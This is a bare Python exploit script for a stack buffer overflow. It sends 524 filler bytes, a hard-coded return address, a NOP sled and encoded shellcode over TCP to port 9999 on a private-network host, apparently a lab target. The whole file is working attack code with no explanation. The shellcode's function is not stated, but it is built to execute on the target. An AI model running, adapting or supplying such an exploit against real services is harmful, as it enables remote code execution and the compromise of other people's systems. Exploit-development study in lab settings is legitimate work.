#!/usr/bin/python
import socket

#return address = x311712f3
retaddr = "\xf3\x12\x17\x31"

shellcode = ("\xd9\xee\xbb\x0c\x3d\x0c\xb3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x14\x83\xea\xfc\x31\x5a\x15\x03\x5a\x15\xee\xc8\x3d\x68\x19"
"\xd1\x6d\xcd\xb6\x7c\x90\x58\xd9\x31\xf2\x97\x99\x69\xa5\x75"
"\xf1\x8f\x59\x6b\x5d\xfa\x49\xda\x0d\x73\x88\xb6\xcb\xdb\x86"
"\xc7\x9a\x9d\x1c\x7b\x98\xad\x7b\xb6\x20\x8e\x33\x2e\xed\x91"
"\xa7\xf6\x87\xae\x9f\xc5\xd7\x98\x66\x2e\xbf\x35\xb6\xbd\x57"
"\x22\xe7\x23\xce\xdc\x7e\x40\x40\x72\x08\x66\xd0\x7f\xc7\xe9")

string = "A"*524 + retaddr + "\x90"*16 + shellcode

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.102',9999))
s.recv(1024)
s.send(string + '\r\n')
s.close()
